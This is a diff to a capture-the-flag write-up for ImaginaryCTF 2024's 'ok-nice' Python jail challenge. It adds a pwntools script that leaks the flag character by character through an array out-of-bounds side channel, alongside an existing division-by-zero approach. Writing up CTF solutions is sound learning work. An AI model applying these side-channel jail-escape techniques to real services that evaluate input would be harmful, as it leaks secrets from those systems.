@@ -1,4 +1,4 @@
-## ImaginaryCTF 2024 ok_nice
+## ImaginaryCTF 2024 ok-nice
 
 ```python
 #!/usr/bin/env python3
@@ -26,7 +26,7 @@ while True:
 Requirements:
 
 1. No numbers: Use `True` as 1
-2. Exception side channel: Use integer division by zero to guess each character
+2. Exception side channel: Use integer division by zero or array out of bounds to guess each character
 3. `len(set(input)) <= 17`: Reuse characters already appeared
 
 Side channel: `1 // (ord(flag[index]) - i)` throws exception when `ord(flag[index]) == i`.
@@ -51,6 +51,30 @@ for index in range(1, 40):
         if res == b"error":
             # zero
             flag.append(i)
+            break
+print(flag)
+```
+
+Alternatively, learned from [official writeup](https://github.com/ImaginaryCTF/ImaginaryCTF-2024-Challenges/blob/main/Misc/ok-nice/README.md), use array out of bounds as side channel to leak each character e.g. `[True,True][ord(flag[True])]`:
+
+```python
+from pwn import *
+
+context(log_level="debug")
+
+p = process(["python3", "ok_nice.py"])
+
+flag = bytearray()
+for index in range(1, 40):
+    flag_index = "+".join(["True"] * index)
+    for i in range(0x20, 0x7F):
+        p.recvuntil(b"input: ")
+        array = ",".join(["True"] * i)
+        p.sendline(f"[{array}][ord(flag[{flag_index}])]".encode())
+        res = p.recvline().strip()
+        if res == b"ok nice":
+            # no longer out of bounds
+            flag.append(i - 1)
             break
 print(flag)
 ```
